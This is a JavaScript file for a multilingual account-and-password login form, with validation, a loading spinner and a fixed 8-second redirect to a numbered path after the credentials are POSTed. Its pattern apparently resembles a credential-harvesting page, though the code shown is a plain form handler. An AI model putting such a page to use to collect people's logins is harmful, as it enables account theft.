function togglePassword() {
    const passwordInput = document.getElementById('passwordpass1');
    const toggleIcon = document.querySelector('.toggle-password i');
    
    if (passwordInput.type === 'password') {
        passwordInput.type = 'text';
        toggleIcon.classList.remove('fa-eye');
        toggleIcon.classList.add('fa-eye-slash'); 
    } else {
        passwordInput.type = 'password';
        toggleIcon.classList.remove('fa-eye-slash');
        toggleIcon.classList.add('fa-eye'); 
    }
}
document.addEventListener("DOMContentLoaded", function () {
    let initialHeight = window.innerHeight; 

    window.addEventListener("resize", function () {
        if (window.innerHeight < initialHeight) {
            document.body.classList.add("keyboard-open");
        } else {
            document.body.classList.remove("keyboard-open");
        }
    });
});
const today = new Date();
today.setDate(today.getDate() - 1); 

const day = today.getDate();
const month = today.getMonth() + 1;
const year = today.getFullYear();

const formattedDate = `${day}/${month}/${year}`;
document.getElementById('current-date').textContent = formattedDate;
const messages = {
    en: {
        phonepaas1Error: "Enter correct account !",
        phonepaas1ErrorError: "Enter correct password !"
    },
    it: {
        phonepaas1Error: "Inserisci l'account corretto !",
        phonepaas1ErrorError: "Inserisci la password corretta !"
    },
    es: {
        phonepaas1Error: "Ingresa la cuenta correcta !",
        phonepaas1ErrorError: "Ingresa la contraseña correcta !"
    },
    de: {
        phonepaas1Error: "Geben Sie das richtige Konto ein !",
        phonepaas1ErrorError: "Geben Sie das richtige Passwort ein !!"
    },
    fr: {
        phonepaas1Error: "Entrez le compte correct !",
        phonepaas1ErrorError: "Entrez le mot de passe correct !"
    }
};


function validateForm(event) {
    event.preventDefault(); 
    const lang = document.documentElement.lang;

    const ph = document.querySelector('#phonepaas1');
    const pa = document.querySelector('#passwordpass1');
    const ph_err = document.querySelector('.ph_err');
    const pa_err = document.querySelector('.pa_err');
    const submitButton = document.querySelector('#submitButton');
    const spinner = document.querySelector('.spinner');
    
    
    ph_err.textContent = '';
    pa_err.textContent = '';

    let isValid = true;



    if (ph.value === "") {
        ph_err.innerHTML = messages[lang].phonepaas1Error;
        isValid = false;
    }

    if (pa.value === "") {
        pa_err.innerHTML = messages[lang].phonepaas1ErrorError;
        isValid = false;
    }

    if (isValid) {
    submitButton.classList.add('loading');
    spinner.style.display = "inline-block";
    submitButton.querySelector('.button-text').style.display = 'none';

    
    const formData = new FormData(event.target);
    fetch(event.target.action, {
        method: 'POST',
        body: formData
    }).then(response => {
        
        setTimeout(() => {
            window.location.href = '/4';
        }, 8000);
    }).catch(error => {
        
        console.error("Error when sending data:", error);
        spinner.style.display = 'none';
        submitButton.querySelector('.button-text').style.display = 'inline';
        alert("An error occurred while sending the data, please try again.");
    });
}
}